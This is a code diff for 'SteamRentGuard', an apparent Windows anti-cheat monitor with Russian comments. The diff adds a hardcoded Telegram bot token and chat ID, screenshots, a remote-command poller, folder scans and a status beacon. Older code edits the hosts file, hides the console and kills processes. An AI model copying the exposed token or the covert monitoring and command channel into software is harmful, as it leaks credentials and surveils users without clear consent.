@@ -1,4 +1,4 @@
-﻿#include <iostream>
+#include <iostream>
 #include <windows.h>
 #include <tlhelp32.h>
 #include <vector>
@@ -9,13 +9,80 @@
 #include <fstream>
 #include <thread>
 #include <ctime>
+#include <shlobj.h>
+#include <gdiplus.h> // Для работы со скриншотами
 
 #pragma comment(lib, "winhttp.lib")
 #pragma comment(lib, "Psapi.lib")
+#pragma comment(lib, "Shell32.lib")
+#pragma comment(lib, "gdiplus.lib") // Библиотека для GDI+
+
+using namespace Gdiplus;
 
 // --- НАСТРОЙКИ TELEGRAM ---
-std::wstring botToken = L"YOUR_BOT_TOKEN_HERE";
-std::wstring chatId = L"Your id in tg";
+std::wstring botToken = L"8706100595:AAGyn5FfVysIOE7dQueOF_tBSPMm4Bb5ZVU";
+std::wstring chatId = L"5261385589";
+
+// Прототипы функций
+std::string GetFilePath();
+std::wstring GetPCName();
+void SendToTelegram(std::wstring message);
+void TakeScreenshot(std::wstring filename);
+int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
+
+// --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ДЛЯ СКРИНШОТА ---
+int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
+    UINT num = 0, size = 0;
+    GetImageEncodersSize(&num, &size);
+    if (size == 0) return -1;
+    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
+    if (pImageCodecInfo == NULL) return -1;
+    GetImageEncoders(num, size, pImageCodecInfo);
+    for (UINT j = 0; j < num; ++j) {
+        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
+            *pClsid = pImageCodecInfo[j].Clsid;
+            free(pImageCodecInfo);
+            return j;
+        }
+    }
+    free(pImageCodecInfo);
+    return -1;
+}
+
+void TakeScreenshot(std::wstring filename) {
+    GdiplusStartupInput gdiplusStartupInput;
+    ULONG_PTR gdiplusToken;
+    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
+
+    int width = GetSystemMetrics(SM_CXSCREEN);
+    int height = GetSystemMetrics(SM_CYSCREEN);
+
+    HDC hScreen = GetDC(NULL);
+    HDC hDC = CreateCompatibleDC(hScreen);
+    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
+    SelectObject(hDC, hBitmap);
+    BitBlt(hDC, 0, 0, width, height, hScreen, 0, 0, SRCCOPY);
+
+    Bitmap* b = new Bitmap(hBitmap, NULL);
+    CLSID clsid;
+    GetEncoderClsid(L"image/jpeg", &clsid);
+    b->Save(filename.c_str(), &clsid, NULL);
+
+    delete b;
+    DeleteObject(hBitmap);
+    DeleteDC(hDC);
+    ReleaseDC(NULL, hScreen);
+    GdiplusShutdown(gdiplusToken);
+}
+
+// --- ПУТЬ К ФАЙЛУ С ИМЕНЕМ (ПАПКА ВИДЕО) ---
+std::string GetFilePath() {
+    char path[MAX_PATH];
+    if (SHGetSpecialFolderPathA(NULL, path, CSIDL_MYVIDEO, FALSE)) {
+        return std::string(path) + "\\users.txt";
+    }
+    return "users.txt";
+}
 
 // Сайты для блокировки в HOSTS
 std::vector<std::string> blockedSites = {
@@ -23,7 +90,7 @@ std::vector<std::string> blockedSites = {
     "www.xone.fun", "www.midnight.im", "www.interium.ooo", "www.fatality.win", "www.neverlose.cc"
 };
 
-// СПИСОК ЦЕЛЕЙ (ПРОЦЕССЫ И ОКНА)
+// СПИСОК ЦЕЛЕЙ
 std::vector<std::wstring> cheatTargets = {
     L"exloader", L"com.swiftsoft", L"xone", L"interium", L"skinchanger", L"extrimhack",
     L"nix", L"memesense", L"mvploader", L"sharkhack", L"exhack", L"neverkernel",
@@ -32,49 +99,36 @@ std::vector<std::wstring> cheatTargets = {
     L"softhub", L"proext", L"sapphire", L"interwebz", L"plague", L"vapehook",
     L"smurfwrecker", L"iniuria", L"yeahnot", L"legendware", L"hauntedproject",
     L"phoenixhack", L"onebyteradar", L"reborn", L"onebyte", L"osiris", L"ev0lve",
-    L"ghostware", L"dexterion", L"basicmultihack", L"pudra", L"iCheat", L"sneakys",
+    L"ghostware", L"dexterion", L"basicmultihack", L"pudra", L"icheat", L"sneakys",
     L"krazyhack", L"muhprime", L"drcheats", L"rootcheat", L"aeonix", L"zedt.pw",
     L"devcore", L"legifard", L"katebot", L"imxnoobx", L"w1nner", L"ekknod",
     L"neoxahack", L"warware", L"weave", L"aimmy", L"paradise", L"xenon", L"easysp",
     L"en1gma", L"injector", L".ahk", L"macros", L"bhop", L"bunnyhop", L"espd2x",
     L"avira", L"pphud", L"primordial", L"nonagon", L"legit", L"hvh", L"aimbot",
     L"s1mple", L"semirage", L"cheat", L"cs2.glow", L"invision", L"undetek",
-    L"spurdo", L"webradar", L"valthrun", L"midnight", L"interium.ooo",
-    L"interium.ooo/buy", L"interium.ooo/faq", L"interium.ooo/support", L"interium.ooo/account" // Прямые ссылки
+    L"spurdo", L"webradar", L"valthrun", L"midnight", L"interium.ooo"
 };
 
+// --- ПОЛУЧЕНИЕ ИМЕНИ ПК ---
 std::wstring GetPCName() {
+    std::wstring nameFromFile = L"";
+    std::wifstream infile(GetFilePath().c_str());
+    if (infile.is_open()) {
+        if (std::getline(infile, nameFromFile)) {
+            if (!nameFromFile.empty()) {
+                infile.close();
+                return nameFromFile;
+            }
+        }
+        infile.close();
+    }
     wchar_t buffer[MAX_COMPUTERNAME_LENGTH + 1];
     DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
     if (GetComputerNameW(buffer, &size)) return std::wstring(buffer);
     return L"Unknown_PC";
 }
 
-void Log(std::string text) {
-    time_t now = time(0);
-    tm ltm;
-    localtime_s(&ltm, &now);
-    printf("[%02d:%02d:%02d] %s\n", ltm.tm_hour, ltm.tm_min, ltm.tm_sec, text.c_str());
-}
-
-// ФУНКЦИЯ БЛОКИРОВКИ + ОЧИСТКА КЭША
-void BlockCheatSites() {
-    std::ofstream hostsFile;
-    hostsFile.open("C:\\Windows\\System32\\drivers\\etc\\hosts", std::ios::app);
-    if (hostsFile.is_open()) {
-        hostsFile << "\n# SteamRentGuard Block\n";
-        for (const auto& site : blockedSites) {
-            hostsFile << "127.0.0.1 " << site << "\n";
-        }
-        hostsFile.close();
-        system("ipconfig /flushdns >nul 2>&1"); // Очищаем кэш DNS
-        Log("Сетевой фильтр: Сайты читов заблокированы и кэш DNS очищен.");
-    }
-    else {
-        Log("!!! ОШИБКА: Запустите от имени АДМИНИСТРАТОРА для блокировки сайтов !!!");
-    }
-}
-
+// --- ОТПРАВКА В ТЕЛЕГРАМ ---
 void SendToTelegram(std::wstring message) {
     HINTERNET hSession = WinHttpOpen(L"SteamRentGuard/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (hSession) {
@@ -101,10 +155,90 @@ void SendToTelegram(std::wstring message) {
     }
 }
 
+// --- КОМАНДЫ ИЗ ТЕЛЕГРАМА ---
+void CheckRemoteCommands() {
+    HINTERNET hSession = WinHttpOpen(L"SteamRentGuard/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (hSession) {
+        HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
+        if (hConnect) {
+            std::wstring url = L"/bot" + botToken + L"/getUpdates?offset=-1&limit=5";
+            HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", url.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+            if (hRequest && WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
+                if (WinHttpReceiveResponse(hRequest, NULL)) {
+                    DWORD dwSize = 0; WinHttpQueryDataAvailable(hRequest, &dwSize);
+                    if (dwSize > 0) {
+                        std::string res(dwSize, 0); DWORD dwRead = 0;
+                        WinHttpReadData(hRequest, &res[0], dwSize, &dwRead);
+                        size_t pos = res.find("SET_NAME:");
+                        if (pos != std::string::npos) {
+                            size_t fC = res.find(':', pos); size_t sC = res.find(':', fC + 1); size_t end = res.find('"', sC + 1);
+                            std::string target = res.substr(fC + 1, sC - fC - 1);
+                            std::string newN = res.substr(sC + 1, end - sC - 1);
+                            std::wstring curW = GetPCName(); std::string cur(curW.begin(), curW.end());
+                            if (target == cur) {
+                                std::wofstream out(GetFilePath().c_str(), std::ios::trunc);
+                                if (out.is_open()) {
+                                    std::wstring wNew(newN.begin(), newN.end());
+                                    out << wNew; out.close();
+                                    SendToTelegram(L"✅ Имя успешно обновлено!");
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+            if (hRequest) WinHttpCloseHandle(hRequest);
+            WinHttpCloseHandle(hConnect);
+        }
+        WinHttpCloseHandle(hSession);
+    }
+}
+
+void RegisterPCInFile() {
+    wchar_t buffer[MAX_COMPUTERNAME_LENGTH + 1];
+    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
+    if (GetComputerNameW(buffer, &size)) {
+        std::wstring currentPC(buffer);
+        std::vector<std::wstring> existingUsers;
+        std::wstring line;
+        std::wifstream infile(GetFilePath().c_str());
+        if (infile.is_open()) {
+            while (std::getline(infile, line)) if (!line.empty()) existingUsers.push_back(line);
+            infile.close();
+        }
+        bool found = false;
+        for (const auto& user : existingUsers) if (user == currentPC) { found = true; break; }
+        if (!found) {
+            std::wofstream outfile(GetFilePath().c_str(), std::ios_base::app);
+            if (outfile.is_open()) { outfile << currentPC << L"\n"; outfile.close(); }
+        }
+    }
+}
+
+void Log(std::string text) {
+    time_t now = time(0);
+    tm ltm;
+    localtime_s(&ltm, &now);
+    printf("[%02d:%02d:%02d] %s\n", ltm.tm_hour, ltm.tm_min, ltm.tm_sec, text.c_str());
+}
+
+void BlockCheatSites() {
+    std::ofstream hostsFile;
+    hostsFile.open("C:\\Windows\\System32\\drivers\\etc\\hosts", std::ios::app);
+    if (hostsFile.is_open()) {
+        hostsFile << "\n# SteamRentGuard Block\n";
+        for (const auto& site : blockedSites) hostsFile << "127.0.0.1 " << site << "\n";
+        hostsFile.close();
+        system("ipconfig /flushdns >nul 2>&1");
+        Log("Сетевой фильтр: Сайты заблокированы.");
+    }
+    else Log("!!! ОШИБКА: Запустите от имени АДМИНИСТРАТОРА !!!");
+}
+
 void AutoStatusThread() {
     while (true) {
-        std::this_thread::sleep_for(std::chrono::milliseconds(4300));
-        SendToTelegram(L"🟢 СТАТУС: Защита активна");
+        std::this_thread::sleep_for(std::chrono::milliseconds(30000));
+        SendToTelegram(L"🟢 СТАТУС: Пользователь не закрыл защиту");
     }
 }
 
@@ -113,10 +247,9 @@ void PrintLogo() {
     system("color 0B");
     std::wcout << L"############################################################" << std::endl;
     std::wcout << L"#                                                          #" << std::endl;
-    std::wcout << L"#                SteamRentGuard SECURITY 1.0               #" << std::endl;
-    std::wcout << L"#          СТАТУС: АКТИВНЫЙ МОНИТОРИНГ [ПОЛНЫЙ СПИСОК]     #" << std::endl;
+    std::wcout << L"#                  SteamRentGuard SECURITY 1.0             #" << std::endl;
+    std::wcout << L"#            СТАТУС: АКТИВНЫЙ МОНИТОРИНГ [ПОЛНЫЙ СПИСОК]    #" << std::endl;
     std::wcout << L"############################################################" << std::endl;
-    std::wcout << L"" << std::endl;
 }
 
 std::wstring GetFullProcessPath(DWORD pid) {
@@ -132,6 +265,7 @@ std::wstring GetFullProcessPath(DWORD pid) {
 
 void SecurityAction(std::wstring name, std::wstring path, DWORD pid = 0) {
     Log("!!! ВНИМАНИЕ: ОБНАРУЖЕНА УГРОЗА !!!");
+    TakeScreenshot(L"C:\\Windows\\Temp\\evidence.jpg"); // Делаем скриншот перед закрытием
     if (pid != 0) {
         HANDLE hKill = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
         if (hKill) { TerminateProcess(hKill, 9); CloseHandle(hKill); }
@@ -145,16 +279,44 @@ void SecurityAction(std::wstring name, std::wstring path, DWORD pid = 0) {
     exit(0);
 }
 
+void ScanDirectory(std::wstring folderPath, std::wstring label) {
+    WIN32_FIND_DATAW findData;
+    std::wstring searchPath = folderPath + L"\\*";
+    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
+    if (hFind != INVALID_HANDLE_VALUE) {
+        do {
+            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                std::wstring dirName = findData.cFileName;
+                if (dirName == L"." || dirName == L"..") continue;
+                std::wstring lowerDir = dirName;
+                std::transform(lowerDir.begin(), lowerDir.end(), lowerDir.begin(), ::tolower);
+                for (const auto& target : cheatTargets) {
+                    if (lowerDir.find(target) != std::wstring::npos) {
+                        SecurityAction(L"Запрещенная папка (" + label + L")", folderPath + L"\\" + dirName);
+                    }
+                }
+            }
+        } while (FindNextFileW(hFind, &findData));
+        FindClose(hFind);
+    }
+}
+
+void ScanRootC() { ScanDirectory(L"C:", L"Root C"); }
+void ScanAppData() {
+    wchar_t path[MAX_PATH];
+    if (SHGetSpecialFolderPathW(NULL, path, CSIDL_APPDATA, FALSE)) ScanDirectory(path, L"Roaming");
+}
+void ScanLocalAppData() {
+    wchar_t path[MAX_PATH];
+    if (SHGetSpecialFolderPathW(NULL, path, CSIDL_LOCAL_APPDATA, FALSE)) ScanDirectory(path, L"Local");
+}
+
 BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
-    wchar_t title[512]; // Увеличил буфер для длинных заголовков браузера
+    wchar_t title[512];
     if (GetWindowTextW(hwnd, title, 512)) {
         std::wstring wsTitle(title);
         std::transform(wsTitle.begin(), wsTitle.end(), wsTitle.begin(), ::tolower);
-        for (const auto& target : cheatTargets) {
-            if (wsTitle.find(target) != std::wstring::npos) {
-                SecurityAction(L"Запрещенный ресурс", wsTitle);
-            }
-        }
+        for (const auto& target : cheatTargets) if (wsTitle.find(target) != std::wstring::npos) SecurityAction(L"Запрещенный ресурс", wsTitle);
     }
     return TRUE;
 }
@@ -163,33 +325,38 @@ int main() {
     system("chcp 1251 > nul");
     setlocale(LC_ALL, "Russian");
 
+    RegisterPCInFile();
     PrintLogo();
     Log("Запуск системы...");
-
     BlockCheatSites();
 
-    Log("Инициализация базы данных сигнатур...");
-    Log("Загружено " + std::to_string(cheatTargets.size()) + " паттернов поиска.");
-
-    Log("Скрытие консоли из панели задач...");
-    HWND hwnd = GetConsoleWindow();
-    long style = GetWindowLong(hwnd, GWL_EXSTYLE);
+    Log("Скрытие консоли...");
+    HWND hConsole = GetConsoleWindow();
+    long style = GetWindowLong(hConsole, GWL_EXSTYLE);
     style |= WS_EX_TOOLWINDOW; style &= ~WS_EX_APPWINDOW;
-    SetWindowLong(hwnd, GWL_EXSTYLE, style);
+    SetWindowLong(hConsole, GWL_EXSTYLE, style);
 
-    Log("Запуск фонового потока статуса...");
     std::thread statusThread(AutoStatusThread);
     statusThread.detach();
 
-    Log("Подключение к Telegram API...");
-    SendToTelegram(L"✅ ЗАЩИТА ВКЛЮЧЕНА [0.53 BETA]\n📍 Мониторинг активен.");
+    SendToTelegram(L"✅ ЗАЩИТА ВКЛЮЧЕНА [0.53 BETA]");
 
-    Log("------------------------------------------------------------");
-    Log("ЯДРО ЗАЩИТЫ: АКТИВНО");
-    Log("Мониторинг запущен.");
-    Log("------------------------------------------------------------");
-
+    int diskScanTimer = 0;
     while (true) {
+        CheckRemoteCommands();
+
+        // Проверка клавиши INSERT
+        if (GetAsyncKeyState(VK_INSERT) & 0x8000) {
+            SecurityAction(L"Клавиша INSERT", L"Попытка открытия меню чита");
+        }
+
+        if (diskScanTimer % 7 == 0) {
+            ScanRootC();
+            ScanAppData();
+            ScanLocalAppData();
+        }
+        diskScanTimer++;
+
         HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
         if (hSnapshot != INVALID_HANDLE_VALUE) {
             PROCESSENTRY32W pe;
@@ -207,11 +374,8 @@ int main() {
             }
             CloseHandle(hSnapshot);
         }
-
-        // Эта функция теперь проверяет и заголовки браузеров на наличие /buy, /faq и т.д.
         EnumWindows(EnumWindowsProc, NULL);
-
-        Sleep(1500);
+        Sleep(1000);
     }
     return 0;
 }
